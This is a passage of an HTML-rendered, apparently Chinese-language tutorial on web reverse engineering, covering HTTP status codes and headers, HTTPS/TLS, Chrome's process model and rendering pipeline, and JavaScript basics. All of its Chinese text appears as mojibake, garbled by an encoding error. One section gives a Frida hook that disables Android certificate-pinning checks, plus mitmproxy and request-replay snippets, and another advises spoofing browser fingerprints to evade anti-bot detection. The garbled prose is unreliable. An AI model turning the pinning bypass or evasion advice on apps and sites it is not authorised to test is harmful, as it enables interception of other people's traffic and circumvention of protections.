<pre><code class="language-http">HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: token=xyz789
Content-Length: 42

{&quot;status&quot;:&quot;success&quot;,&quot;data&quot;:{&quot;id&quot;:123}}
</code></pre>
<p><strong>ç»„æˆéƒ¨åˆ†</strong>ï¼š</p>
<ol>
<li>çŠ¶æ€è¡Œï¼šåè®®ç‰ˆæœ¬ + çŠ¶æ€ç  + çŠ¶æ€æè¿°</li>
<li>å“åº”å¤´</li>
<li>ç©ºè¡Œ</li>
<li>å“åº”ä½“</li>
</ol>
<hr />
<h2>çŠ¶æ€ç </h2>
<h3>1xx ä¿¡æ¯å“åº”</h3>
<ul>
<li><strong>100 Continue</strong>: ç»§ç»­è¯·æ±‚</li>
<li><strong>101 Switching Protocols</strong>: åˆ‡æ¢åè®®</li>
</ul>
<h3>2xx æˆåŠŸ</h3>
<ul>
<li><strong>200 OK</strong>: è¯·æ±‚æˆåŠŸ</li>
<li><strong>201 Created</strong>: èµ„æºå·²åˆ›å»º</li>
<li><strong>204 No Content</strong>: æ— å†…å®¹è¿”å›</li>
</ul>
<h3>3xx é‡å®šå‘</h3>
<ul>
<li><strong>301 Moved Permanently</strong>: æ°¸ä¹…é‡å®šå‘</li>
<li><strong>302 Found</strong>: ä¸´æ—¶é‡å®šå‘</li>
<li><strong>304 Not Modified</strong>: èµ„æºæœªä¿®æ”¹</li>
</ul>
<h3>4xx å®¢æˆ·ç«¯é”™è¯¯</h3>
<ul>
<li><strong>400 Bad Request</strong>: è¯·æ±‚é”™è¯¯</li>
<li><strong>401 Unauthorized</strong>: æœªæˆæƒ</li>
<li><strong>403 Forbidden</strong>: ç¦æ­¢è®¿é—®</li>
<li><strong>404 Not Found</strong>: èµ„æºä¸å­˜åœ¨</li>
<li><strong>429 Too Many Requests</strong>: è¯·æ±‚è¿‡å¤š</li>
</ul>
<h3>5xx æœåŠ¡å™¨é”™è¯¯</h3>
<ul>
<li><strong>500 Internal Server Error</strong>: æœåŠ¡å™¨å†…éƒ¨é”™è¯¯</li>
<li><strong>502 Bad Gateway</strong>: ç½‘å…³é”™è¯¯</li>
<li><strong>503 Service Unavailable</strong>: æœåŠ¡ä¸å¯ç”¨</li>
</ul>
<hr />
<h2>é‡è¦çš„ HTTP å¤´éƒ¨</h2>
<h3>è¯·æ±‚å¤´</h3>
<table>
<thead>
<tr>
  <th>Header</th>
  <th>è¯´æ˜</th>
  <th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>User-Agent</code></td>
  <td>å®¢æˆ·ç«¯æ ‡è¯†</td>
  <td><code>Mozilla/5.0 (Windows NT 10.0; Win64; x64)</code></td>
</tr>
<tr>
  <td><code>Accept</code></td>
  <td>å¯æ¥å—çš„å†…å®¹ç±»å‹</td>
  <td><code>application/json, text/html</code></td>
</tr>
<tr>
  <td><code>Accept-Encoding</code></td>
  <td>å¯æ¥å—çš„ç¼–ç </td>
  <td><code>gzip, deflate, br</code></td>
</tr>
<tr>
  <td><code>Accept-Language</code></td>
  <td>å¯æ¥å—çš„è¯­è¨€</td>
  <td><code>zh-CN,zh;q=0.9,en;q=0.8</code></td>
</tr>
<tr>
  <td><code>Cookie</code></td>
  <td>Cookie ä¿¡æ¯</td>
  <td><code>session_id=abc123; token=xyz</code></td>
</tr>
<tr>
  <td><code>Referer</code></td>
  <td>æ¥æºé¡µé¢</td>
  <td><code>https://example.com/page1</code></td>
</tr>
<tr>
  <td><code>Origin</code></td>
  <td>è¯·æ±‚æ¥æº</td>
  <td><code>https://example.com</code></td>
</tr>
<tr>
  <td><code>Authorization</code></td>
  <td>è®¤è¯ä¿¡æ¯</td>
  <td><code>Bearer eyJhbGciOiJIUzI1NiIs...</code></td>
</tr>
<tr>
  <td><code>Content-Type</code></td>
  <td>è¯·æ±‚ä½“ç±»å‹</td>
  <td><code>application/json</code></td>
</tr>
<tr>
  <td><code>Content-Length</code></td>
  <td>è¯·æ±‚ä½“é•¿åº¦</td>
  <td><code>256</code></td>
</tr>
</tbody>
</table>
<h3>å“åº”å¤´</h3>
<table>
<thead>
<tr>
  <th>Header</th>
  <th>è¯´æ˜</th>
  <th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>Content-Type</code></td>
  <td>å“åº”å†…å®¹ç±»å‹</td>
  <td><code>application/json; charset=utf-8</code></td>
</tr>
<tr>
  <td><code>Content-Length</code></td>
  <td>å“åº”ä½“é•¿åº¦</td>
  <td><code>1024</code></td>
</tr>
<tr>
  <td><code>Set-Cookie</code></td>
  <td>è®¾ç½® Cookie</td>
  <td><code>session_id=abc; Path=/; HttpOnly</code></td>
</tr>
<tr>
  <td><code>Cache-Control</code></td>
  <td>ç¼“å­˜æ§åˆ¶</td>
  <td><code>no-cache, no-store, must-revalidate</code></td>
</tr>
<tr>
  <td><code>Access-Control-Allow-Origin</code></td>
  <td>CORS å…è®¸çš„æº</td>
  <td><code>*</code> æˆ– <code>https://example.com</code></td>
</tr>
<tr>
  <td><code>Location</code></td>
  <td>é‡å®šå‘åœ°å€</td>
  <td><code>https://example.com/new-page</code></td>
</tr>
<tr>
  <td><code>Content-Encoding</code></td>
  <td>å†…å®¹ç¼–ç </td>
  <td><code>gzip</code></td>
</tr>
<tr>
  <td><code>ETag</code></td>
  <td>èµ„æºæ ‡è¯†</td>
  <td><code>&quot;33a64df551425fcc55e4d42a148795d9f25f89d4&quot;</code></td>
</tr>
</tbody>
</table>
<hr />
<h2>HTTPS å·¥ä½œåŸç†</h2>
<h3>TLS/SSL åŠ å¯†</h3>
<p>HTTPS åœ¨ HTTP åŸºç¡€ä¸Šå¢åŠ äº† TLS/SSL åŠ å¯†å±‚ï¼š</p>
<pre><code>åº”ç”¨å±‚: HTTP
å®‰å…¨å±‚: TLS/SSL
ä¼ è¾“å±‚: TCP
ç½‘ç»œå±‚: IP
</code></pre>
<h3>TLS æ¡æ‰‹è¿‡ç¨‹</h3>
<ol>
<li><strong>ClientHello</strong>: å®¢æˆ·ç«¯å‘é€æ”¯æŒçš„åŠ å¯†å¥—ä»¶ã€TLS ç‰ˆæœ¬ç­‰</li>
<li><strong>ServerHello</strong>: æœåŠ¡å™¨é€‰æ‹©åŠ å¯†å¥—ä»¶ï¼Œå‘é€è¯ä¹¦</li>
<li><strong>è¯ä¹¦éªŒè¯</strong>: å®¢æˆ·ç«¯éªŒè¯æœåŠ¡å™¨è¯ä¹¦</li>
<li><strong>å¯†é’¥äº¤æ¢</strong>: ä½¿ç”¨ RSA æˆ– DH ç®—æ³•äº¤æ¢å¯†é’¥</li>
<li><strong>å®Œæˆæ¡æ‰‹</strong>: åŒæ–¹ç¡®è®¤ï¼Œå¼€å§‹åŠ å¯†é€šä¿¡</li>
</ol>
<h3>è¯ä¹¦éªŒè¯</h3>
<ul>
<li><strong>è¯ä¹¦é“¾</strong>: æœåŠ¡å™¨è¯ä¹¦ â†’ ä¸­é—´è¯ä¹¦ â†’ æ ¹è¯ä¹¦</li>
<li><strong>ä¿¡ä»»é”šç‚¹</strong>: æ“ä½œç³»ç»Ÿ/æµè§ˆå™¨å†…ç½®çš„æ ¹è¯ä¹¦</li>
<li><strong>è¯ä¹¦åŠé”€</strong>: CRL å’Œ OCSP æ£€æŸ¥</li>
</ul>
<hr />
<h2>é€†å‘åˆ†æä¸­çš„åº”ç”¨</h2>
<h3>1. æµé‡åˆ†æ</h3>
<p>ä½¿ç”¨ä»£ç†å·¥å…·æ‹¦æˆªå’Œåˆ†æ HTTPS æµé‡ï¼š</p>
<pre><code class="language-bash"># ä½¿ç”¨ mitmproxy
mitmproxy --mode transparent --set console_mouse=false

# ä½¿ç”¨ Burp Suite
# é…ç½®æµè§ˆå™¨ä»£ç†åˆ° 127.0.0.1:8080
# å®‰è£… Burp CA è¯ä¹¦
</code></pre>
<h3>2. è¯ä¹¦ç»•è¿‡</h3>
<p>æŸäº›åº”ç”¨ä¼šè¿›è¡Œè¯ä¹¦å›ºå®šï¼ˆCertificate Pinningï¼‰ï¼Œéœ€è¦ç»•è¿‡ï¼š</p>
<pre><code class="language-javascript">// Hook Java çš„è¯ä¹¦éªŒè¯ (Android)
Java.perform(function () {
  var TrustManager = Java.use(&quot;javax.net.ssl.X509TrustManager&quot;);
  TrustManager.checkServerTrusted.implementation = function (chain, authType) {
    console.log(&quot;Certificate pinning bypassed&quot;);
  };
});
</code></pre>
<h3>3. è¯·æ±‚é‡æ”¾</h3>
<p>æ•è·è¯·æ±‚åå¯ä»¥ä¿®æ”¹å‚æ•°é‡æ”¾ï¼š</p>
<pre><code class="language-python">import requests

headers = {
    'User-Agent': 'Mozilla/5.0',
    'Authorization': 'Bearer token123'
}

response = requests.post(
    'https://api.example.com/data',
    headers=headers,
    json={'key': 'value'}
)
</code></pre>
<h3>4. ç­¾ååˆ†æ</h3>
<p>å¾ˆå¤š API ä¼šå¯¹è¯·æ±‚å‚æ•°è¿›è¡Œç­¾åï¼š</p>
<pre><code class="language-javascript">// å¸¸è§çš„ç­¾åç”Ÿæˆæµç¨‹
function generateSignature(params) {
  // 1. å‚æ•°æ’åº
  const sorted = Object.keys(params).sort();

  // 2. æ‹¼æ¥å­—ç¬¦ä¸²
  let str = &quot;&quot;;
  sorted.forEach((key) =&gt; {
    str += key + &quot;=&quot; + params[key] + &quot;&amp;&quot;;
  });

  // 3. åŠ ä¸Šå¯†é’¥
  str += &quot;secret_key&quot;;

  // 4. MD5/SHA256 å“ˆå¸Œ
  return md5(str);
}
</code></pre>
<hr />
<h2>HTTP/2 ç‰¹æ€§</h2>
<h3>å¤šè·¯å¤ç”¨</h3>
<ul>
<li>å•ä¸ª TCP è¿æ¥å¯ä»¥å¹¶å‘å¤šä¸ªè¯·æ±‚</li>
<li>è§£å†³äº† HTTP/1.1 çš„é˜Ÿå¤´é˜»å¡é—®é¢˜</li>
</ul>
<h3>äºŒè¿›åˆ¶åˆ†å¸§</h3>
<ul>
<li>ä½¿ç”¨äºŒè¿›åˆ¶æ ¼å¼è€Œéæ–‡æœ¬</li>
<li>æ›´é«˜æ•ˆçš„è§£æ</li>
</ul>
<h3>æœåŠ¡å™¨æ¨é€</h3>
<ul>
<li>æœåŠ¡å™¨å¯ä»¥ä¸»åŠ¨æ¨é€èµ„æº</li>
<li>å‡å°‘è¯·æ±‚æ¬¡æ•°</li>
</ul>
<h3>å¤´éƒ¨å‹ç¼©</h3>
<ul>
<li>ä½¿ç”¨ HPACK ç®—æ³•å‹ç¼©å¤´éƒ¨</li>
<li>å‡å°‘ä¼ è¾“æ•°æ®é‡</li>
</ul>
<hr />
<h2>å¸¸è§é—®é¢˜</h2>
<h3>Q: å¦‚ä½•åœ¨é€†å‘æ—¶è¯†åˆ« API åŠ å¯†ï¼Ÿ</h3>
<p><strong>A</strong>:</p>
<ol>
<li>æŠ“åŒ…è§‚å¯Ÿè¯·æ±‚å‚æ•°æ˜¯å¦æœ‰æ˜æ˜¾çš„åŠ å¯†ç‰¹å¾ï¼ˆBase64ã€Hex ç¼–ç ï¼‰</li>
<li>åœ¨æµè§ˆå™¨ DevTools ä¸­æœç´¢å‚æ•°åï¼Œå®šä½åˆ°ç”Ÿæˆä»£ç </li>
<li>è®¾ç½®æ–­ç‚¹ï¼Œè¿½è¸ªå‚æ•°ç”Ÿæˆæµç¨‹</li>
<li>è¯†åˆ«ä½¿ç”¨çš„åŠ å¯†ç®—æ³•ï¼ˆå¸¸è§çš„æœ‰ MD5ã€SHA256ã€AES ç­‰ï¼‰</li>
</ol>
<h3>Q: HTTPS ä¸€å®šå®‰å…¨å—ï¼Ÿ</h3>
<p><strong>A</strong>:
ä¸ä¸€å®šã€‚HTTPS åªä¿è¯ä¼ è¾“å±‚å®‰å…¨ï¼Œä½†ä¸èƒ½é˜²æ­¢ï¼š</p>
<ul>
<li>XSS æ”»å‡»</li>
<li>CSRF æ”»å‡»</li>
<li>ä¸­é—´äººæ”»å‡»ï¼ˆå¦‚æœè¯ä¹¦éªŒè¯è¢«ç»•è¿‡ï¼‰</li>
<li>åº”ç”¨å±‚çš„é€»è¾‘æ¼æ´</li>
</ul>
<h3>Q: å¦‚ä½•å¤„ç† HTTP/2 çš„æµé‡åˆ†æï¼Ÿ</h3>
<p><strong>A</strong>:</p>
<ul>
<li>ä½¿ç”¨æ”¯æŒ HTTP/2 çš„ä»£ç†å·¥å…·ï¼ˆå¦‚æœ€æ–°ç‰ˆ Burp Suiteã€Charlesï¼‰</li>
<li>æµè§ˆå™¨ DevTools å¯ä»¥æŸ¥çœ‹ HTTP/2 æµé‡</li>
<li>Wireshark å¯ä»¥è§£æ HTTP/2 åè®®ï¼ˆéœ€è¦ SSL å¯†é’¥ï¼‰</li>
</ul>
<hr />
<h2>è¿›é˜¶é˜…è¯»</h2>
<ul>
<li><a href="https://tools.ietf.org/html/rfc7230">RFC 7230 - HTTP/1.1 Message Syntax and Routing</a></li>
<li><a href="https://tools.ietf.org/html/rfc7540">RFC 7540 - HTTP/2</a></li>
<li><a href="https://tools.ietf.org/html/rfc8446">RFC 8446 - TLS 1.3</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP">MDN Web Docs - HTTP</a></li>
</ul>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-13">TLS/SSL æ¡æ‰‹è¿‡ç¨‹</a></li>
<li><a href="#section-12">CORS ä¸åŒæºç­–ç•¥</a></li>
<li><a href="#section-15">æµè§ˆå™¨å¼€å‘è€…å·¥å…·</a></li>
<li><a href="#section-16">Burp Suite æŒ‡å—</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-6">
                                                <h2>[R05] Browser Architecture</h2>
                                                <h1>R05: æµè§ˆå™¨æ¶æ„ä¸æ¸²æŸ“å¼•æ“</h1>
<h2>æ¦‚è¿°</h2>
<p>äº†è§£æµè§ˆå™¨çš„å†…éƒ¨æ¶æ„å’Œæ¸²æŸ“æµç¨‹ï¼Œæœ‰åŠ©äºé€†å‘å·¥ç¨‹å¸ˆç†è§£é¡µé¢æ˜¯å¦‚ä½•ä»ä»£ç å˜æˆå¯è§†åŒ–çš„åƒç´ çš„ï¼Œä»¥åŠå¦‚ä½•åˆ©ç”¨è¿™äº›æœºåˆ¶æ¥æ£€æµ‹è‡ªåŠ¨åŒ–å·¥å…·æˆ–åè°ƒè¯•ã€‚</p>
<hr />
<h2>æµè§ˆå™¨ä½œä¸ºæ“ä½œç³»ç»Ÿ</h2>
<p>ç°ä»£æµè§ˆå™¨ï¼ˆå¦‚ Chromeï¼‰ä¸ä»…ä»…æ˜¯ä¸€ä¸ªç®€å•çš„æ–‡æ¡£æŸ¥çœ‹å™¨ï¼Œå®ƒæ›´åƒæ˜¯ä¸€ä¸ªæ“ä½œç³»ç»Ÿã€‚</p>
<h3>å¤šè¿›ç¨‹æ¶æ„ (Chrome æ¨¡å‹)</h3>
<p>ä¸ºäº†ç¨³å®šæ€§å’Œå®‰å…¨æ€§ï¼Œç°ä»£æµè§ˆå™¨é‡‡ç”¨å¤šè¿›ç¨‹æ¶æ„ï¼š</p>
<pre><code class="language-mermaid">graph TB
    subgraph Chrome[&quot;Chrome æµè§ˆå™¨&quot;]
        Browser[Browser Process&lt;br/&gt;ä¸»è¿›ç¨‹&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ UI ç®¡ç†&lt;br/&gt;â€¢ ç½‘ç»œè¯·æ±‚&lt;br/&gt;â€¢ è¿›ç¨‹åè°ƒ&lt;br/&gt;â€¢ æƒé™ç®¡ç†]

        subgraph Renderers[&quot;Renderer Processes (æ¸²æŸ“è¿›ç¨‹)&quot;]
            R1[Tab 1&lt;br/&gt;â”â”â”â”â”â”â”&lt;br/&gt;â€¢ Blink å¼•æ“&lt;br/&gt;â€¢ V8 å¼•æ“&lt;br/&gt;â€¢ DOM/CSSOM&lt;br/&gt;â€¢ JavaScript]
            R2[Tab 2&lt;br/&gt;â”â”â”â”â”â”â”&lt;br/&gt;â€¢ Blink å¼•æ“&lt;br/&gt;â€¢ V8 å¼•æ“&lt;br/&gt;â€¢ DOM/CSSOM&lt;br/&gt;â€¢ JavaScript]
            R3[Tab 3&lt;br/&gt;â”â”â”â”â”â”â”&lt;br/&gt;â€¢ Blink å¼•æ“&lt;br/&gt;â€¢ V8 å¼•æ“&lt;br/&gt;â€¢ DOM/CSSOM&lt;br/&gt;â€¢ JavaScript]
        end

        GPU[GPU Process&lt;br/&gt;GPU è¿›ç¨‹&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ Canvas æ¸²æŸ“&lt;br/&gt;â€¢ WebGL&lt;br/&gt;â€¢ CSS 3D å˜æ¢&lt;br/&gt;â€¢ è§†é¢‘è§£ç ]

        Plugin[Plugin Process&lt;br/&gt;æ’ä»¶è¿›ç¨‹&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ Flash (å·²å¼ƒç”¨)&lt;br/&gt;â€¢ PDF é˜…è¯»å™¨&lt;br/&gt;â€¢ å…¶ä»–æ’ä»¶]

        Network[Network Service&lt;br/&gt;ç½‘ç»œæœåŠ¡&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ HTTP/HTTPS&lt;br/&gt;â€¢ WebSocket&lt;br/&gt;â€¢ DNS è§£æ]
    end

    Browser --&gt; R1
    Browser --&gt; R2
    Browser --&gt; R3
    Browser --&gt; GPU
    Browser --&gt; Plugin
    Browser --&gt; Network

    R1 --&gt; GPU
    R2 --&gt; GPU
    R3 --&gt; GPU

    style Browser fill:#4a90e2
    style R1 fill:#7ed321
    style R2 fill:#7ed321
    style R3 fill:#7ed321
    style GPU fill:#f5a623
    style Plugin fill:#bd10e0
    style Network fill:#50e3c2
</code></pre>
<p><strong>å„è¿›ç¨‹èŒè´£</strong>:</p>
<ol>
<li><strong>Browser Process (ä¸»è¿›ç¨‹)</strong>: è´Ÿè´£åœ°å€æ ã€ä¹¦ç­¾ã€å‰è¿›/åé€€ã€åè°ƒå…¶ä»–è¿›ç¨‹ã€‚</li>
<li><strong>Renderer Process (æ¸²æŸ“è¿›ç¨‹)</strong>: <strong>æ ¸å¿ƒå…³æ³¨ç‚¹</strong>ã€‚è´Ÿè´£å°† HTML/CSS/JS è½¬æ¢ä¸ºç½‘é¡µã€‚<ul>
<li>é€šå¸¸æ¯ä¸ª Tab æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹ï¼ˆSite Isolationï¼‰ã€‚</li>
<li>JS ä¹Ÿæ˜¯è¿è¡Œåœ¨è¿™é‡Œï¼ˆV8 å¼•æ“ï¼‰ã€‚</li>
</ul>
</li>
<li><strong>GPU Process</strong>: å¤„ç† GPU ä»»åŠ¡ï¼ˆCSS 3D å˜æ¢ã€Canvas ç»˜å›¾ï¼‰ã€‚</li>
<li><strong>Plugin Process</strong>: è¿è¡Œ Flash ç­‰æ’ä»¶ã€‚</li>
<li><strong>Network Service</strong>: å¤„ç†æ‰€æœ‰ç½‘ç»œè¯·æ±‚ã€‚</li>
</ol>
<h3>é€†å‘å¯ç¤º</h3>
<ul>
<li><strong>å†…å­˜éš”ç¦»</strong>: ç”±äºä¸åŒ Tab åœ¨ä¸åŒè¿›ç¨‹ï¼Œä½ ä¸èƒ½ç®€å•åœ°è·¨ Tab ç›´æ¥è¯»å†™å†…å­˜æ•°æ®ï¼ˆé™¤éé€šè¿‡ DevTools åè®®ï¼‰ã€‚</li>
<li><strong>Headless æ£€æµ‹</strong>: æ— å¤´æµè§ˆå™¨ï¼ˆHeadless Chromeï¼‰åœ¨å¯åŠ¨æ—¶æŸäº›å›¾å½¢ç›¸å…³çš„è¿›ç¨‹è¡Œä¸ºæˆ– GPU å‚æ•°å¯èƒ½ä¸æ­£å¸¸æµè§ˆå™¨ä¸åŒï¼Œè¿™å¸¸è¢«ç”¨äºåçˆ¬æ£€æµ‹ã€‚</li>
</ul>
<hr />
<h2>æ¸²æŸ“æµç¨‹ (Rendering Pipeline)</h2>
<p>ç†è§£æ¸²æŸ“æµç¨‹å¯¹äºåˆ†æåçˆ¬è™«æŠ€æœ¯ï¼ˆå¦‚éªŒè¯ç çš„äººæœºè¯†åˆ«ã€DOM æ··æ·†ï¼‰å¾ˆæœ‰å¸®åŠ©ã€‚</p>
<h3>1. è§£æ (Parsing)</h3>
<ul>
<li><strong>HTML -&gt; DOM</strong>: è§£æ HTML æ–‡æœ¬ç”Ÿæˆ DOM æ ‘ã€‚</li>
<li><strong>CSS -&gt; CSSOM</strong>: è§£æ CSS ç”Ÿæˆ CSSOM æ ‘ã€‚</li>
</ul>
<h3>2. å¸ƒå±€ (Layout / Reflow)</h3>
<ul>
<li>DOM + CSSOM åˆå¹¶ä¸º <strong>Render Tree</strong>ã€‚</li>
<li>è®¡ç®—æ¯ä¸ªèŠ‚ç‚¹çš„ç¡®åˆ‡å‡ ä½•ä½ç½®ï¼ˆåæ ‡ã€å®½é«˜ï¼‰ã€‚</li>
<li><strong>Reflow (å›æµ)</strong>: å½“é¡µé¢å¸ƒå±€å‘ç”Ÿå˜åŒ–ï¼ˆå¦‚ JS ä¿®æ”¹äº†å®½é«˜ï¼‰ï¼Œæµè§ˆå™¨éœ€è¦é‡æ–°è®¡ç®—å¸ƒå±€ã€‚è¿™å¾ˆæ¶ˆè€—æ€§èƒ½ã€‚</li>
</ul>
<h3>3. ç»˜åˆ¶ (Painting / Repaint)</h3>
<ul>
<li>å°† Render Tree è½¬æ¢ä¸ºå±å¹•ä¸Šçš„åƒç´ ã€‚</li>
<li><strong>Repaint (é‡ç»˜)</strong>: æ”¹å˜é¢œè‰²ä½†ä¸å˜å¸ƒå±€çš„æ“ä½œã€‚</li>
</ul>
<h3>4. åˆæˆ (Compositing)</h3>
<ul>
<li>æµè§ˆå™¨å°†é¡µé¢åˆ†ä¸ºå¤šä¸ªå›¾å±‚ï¼ˆLayersï¼‰ï¼ŒGPU å°†è¿™äº›å›¾å±‚åˆæˆä¸€å¼ å›¾ç‰‡ã€‚</li>
</ul>
<h3>å®Œæ•´æ¸²æŸ“æµç¨‹å›¾</h3>
<pre><code class="language-mermaid">flowchart TB
    subgraph Input[&quot;è¾“å…¥é˜¶æ®µ&quot;]
        HTML[HTML æ–‡æ¡£]
        CSS[CSS æ ·å¼è¡¨]
        JS[JavaScript]
    end

    subgraph Parse[&quot;è§£æé˜¶æ®µ&quot;]
        HTMLParse[HTML è§£æå™¨]
        CSSParse[CSS è§£æå™¨]
        DOM[DOM Tree]
        CSSOM[CSSOM Tree]
    end

    subgraph Render[&quot;æ¸²æŸ“æ ‘æ„å»º&quot;]
        RenderTree[Render Tree&lt;br/&gt;åˆå¹¶ DOM + CSSOM]
    end

    subgraph Layout[&quot;å¸ƒå±€è®¡ç®—&quot;]
        LayoutCalc[è®¡ç®—å‡ ä½•ä½ç½®&lt;br/&gt;Layout/Reflow]
    end

    subgraph Paint[&quot;ç»˜åˆ¶&quot;]
        PaintOps[ç”Ÿæˆç»˜åˆ¶æŒ‡ä»¤&lt;br/&gt;Painting/Repaint]
        Layers[åˆ†å±‚ Layering]
    end

    subgraph Composite[&quot;åˆæˆ&quot;]
        Raster[æ …æ ¼åŒ– Rasterize]
        GPUComp[GPU åˆæˆ]
        Display[æ˜¾ç¤ºåˆ°å±å¹•]
    end

    HTML --&gt; HTMLParse --&gt; DOM
    CSS --&gt; CSSParse --&gt; CSSOM
    DOM --&gt; RenderTree
    CSSOM --&gt; RenderTree
    RenderTree --&gt; LayoutCalc
    LayoutCalc --&gt; PaintOps
    PaintOps --&gt; Layers
    Layers --&gt; Raster
    Raster --&gt; GPUComp
    GPUComp --&gt; Display

    JS -.-&gt;|ä¿®æ”¹ DOM| DOM
    JS -.-&gt;|ä¿®æ”¹æ ·å¼| CSSOM
    JS -.-&gt;|è§¦å‘ Reflow| LayoutCalc
    JS -.-&gt;|è§¦å‘ Repaint| PaintOps

    style Display fill:#51cf66
    style JS fill:#fff9e1
</code></pre>
<h3>[Reverse Engineering Context] é˜»å¡ä¸æ£€æµ‹</h3>
<ul>
<li><strong>JS é˜»å¡æ¸²æŸ“</strong>: JS å¼•æ“å’Œæ¸²æŸ“å¼•æ“é€šå¸¸æ˜¯äº’æ–¥çš„ï¼ˆè¿è¡Œåœ¨åŒä¸€ä¸»çº¿ç¨‹ï¼‰ã€‚å¦‚æœ JS æ‰§è¡Œæ­»å¾ªç¯æˆ–ç¹é‡è®¡ç®—ï¼Œé¡µé¢ä¼šå‡æ­»ã€‚</li>
<li><strong>æ£€æµ‹ä¸å¯è§å…ƒç´ </strong>: æŸäº›åçˆ¬è™«ä¼šåœ¨é¡µé¢æ’å…¥ <code>opacity: 0</code> æˆ– <code>visibility: hidden</code> çš„å…ƒç´ æ¥è¿·æƒ‘çˆ¬è™«ã€‚è™½ç„¶äººçœ¼çœ‹ä¸è§ï¼Œä½†å®ƒä»¬å­˜åœ¨äº DOM å’Œ CSSOM ä¸­ã€‚å¦‚æœçˆ¬è™«å°è¯•ç‚¹å‡»è¿™äº›â€œä¸å¯è§â€çš„é™·é˜±å…ƒç´ ï¼Œå°±ä¼šæš´éœ²èº«ä»½ã€‚</li>
</ul>
<hr />
<h2>JavaScript å¼•æ“ (V8)</h2>
<p>V8 æ˜¯ Chrome çš„ JS å¼•æ“ï¼Œä¹Ÿæ˜¯ Node.js çš„æ ¸å¿ƒã€‚</p>
<ol>
<li><strong>JIT (Just-In-Time) ç¼–è¯‘</strong>: V8 ä¸åªæ˜¯è§£é‡Šæ‰§è¡Œï¼Œè¿˜ä¼šå°†çƒ­ç‚¹ä»£ç ç¼–è¯‘æˆæœºå™¨ç ã€‚</li>
<li><strong>åƒåœ¾å›æ”¶ (GC)</strong>: è‡ªåŠ¨ç®¡ç†å†…å­˜ã€‚</li>
</ol>
<hr />
<h2>æµè§ˆå™¨æŒ‡çº¹ (Browser Fingerprinting)</h2>
<p>æµè§ˆå™¨æ¶æ„çš„å¾®å°å·®å¼‚å¯¼è‡´äº†æŒ‡çº¹çš„äº§ç”Ÿã€‚</p>
<ul>
<li><strong>Canvas æŒ‡çº¹</strong>: ä¸åŒ OS + æ˜¾å¡ + é©±åŠ¨åœ¨æ¸²æŸ“å­—ä½“å’ŒæŠ—é”¯é½¿æ—¶æœ‰å¾®å°å·®å¼‚ã€‚</li>
<li><strong>WebGL æŒ‡çº¹</strong>: åŒæ ·åˆ©ç”¨ GPU çš„å·®å¼‚ã€‚</li>
<li><strong>Font æŒ‡çº¹</strong>: ç³»ç»Ÿå®‰è£…çš„å­—ä½“åˆ—è¡¨ã€‚</li>
</ul>
<p>é€†å‘å·¥ç¨‹å¸ˆéœ€è¦è¯†åˆ«è¿™äº›æŒ‡çº¹é‡‡é›†ç‚¹ï¼Œä»¥ä¾¿åœ¨è‡ªåŠ¨åŒ–å·¥å…·ä¸­è¿›è¡Œä¼ªé€ ï¼ˆMockï¼‰ã€‚</p>
<hr />
<h2>æ€»ç»“</h2>
<p>æµè§ˆå™¨æ¶æ„çœ‹ä¼¼åº•å±‚ï¼Œä½†å…¶å®ä¸ä¸Šå±‚çš„ JS é€†å‘æ¯æ¯ç›¸å…³ã€‚ä»è¿›ç¨‹æ¨¡å‹åˆ°æ¸²æŸ“æµæ°´çº¿ï¼Œæ¯ä¸€ä¸ªç¯èŠ‚éƒ½å¯èƒ½éšè—ç€åçˆ¬è™«çš„æ£€æµ‹ç‚¹æˆ– Bypass çš„åˆ‡å…¥ç‚¹ã€‚</p>

                                            </div>
                                            
                                            <div class="section" id="section-7">
                                                <h2>[R06] JavaScript Basics</h2>
                                                <h1>R06: JavaScript åŸºç¡€</h1>
<h2>æ¦‚è¿°</h2>
<p>JavaScript æ˜¯ Web é€†å‘å·¥ç¨‹ä¸­æœ€é‡è¦çš„è¯­è¨€ã€‚æŒæ¡ JavaScript çš„æ ¸å¿ƒæ¦‚å¿µå¯¹äºç†è§£å’Œåˆ†æ Web åº”ç”¨è‡³å…³é‡è¦ã€‚</p>
<hr />
<h2>æ•°æ®ç±»å‹</h2>
<h3>åŸºæœ¬ç±»å‹ï¼ˆPrimitive Typesï¼‰</h3>
<pre><code class="language-javascript">// Number
let num = 42;
let float = 3.14;
let hex = 0xff; // 255

// String
let str = &quot;Hello&quot;;
let str2 = &quot;World&quot;;
let template = `${str} ${str2}`; // &quot;Hello World&quot;

// Boolean
let isTrue = true;
let isFalse = false;

// Undefined
let notDefined;
console.log(notDefined); // undefined

// Null
let empty = null;

// Symbol (ES6+)
let sym = Symbol(&quot;description&quot;);

// BigInt (ES2020+)
let bigNum = 1234567890123456789012345678901234567890n;
</code></pre>
<h3>å¼•ç”¨ç±»å‹ï¼ˆReference Typesï¼‰</h3>
<pre><code class="language-javascript">// Object
let obj = {
  name: &quot;John&quot;,
  age: 30,
  greet: function () {
    console.log(&quot;Hello&quot;);
  },
};

// Array
let arr = [1, 2, 3, 4, 5];
let mixed = [1, &quot;two&quot;, true, null, { key: &quot;value&quot; }];

// Function
function myFunc() {
  return &quot;Hello&quot;;
}

// Date
let date = new Date();

// RegExp
let regex = /pattern/gi;
</code></pre>
<hr />
<h2>å˜é‡å£°æ˜</h2>
<h3>var vs let vs const</h3>
<pre><code class="language-javascript">// var: å‡½æ•°ä½œç”¨åŸŸï¼Œå­˜åœ¨å˜é‡æå‡
var x = 1;
if (true) {
  var x = 2; // åŒä¸€ä¸ªå˜é‡
  console.log(x); // 2
}
console.log(x); // 2

// let: å—ä½œç”¨åŸŸï¼Œæ— å˜é‡æå‡
let y = 1;
if (true) {
  let y = 2; // ä¸åŒçš„å˜é‡
  console.log(y); // 2
}
console.log(y); // 1

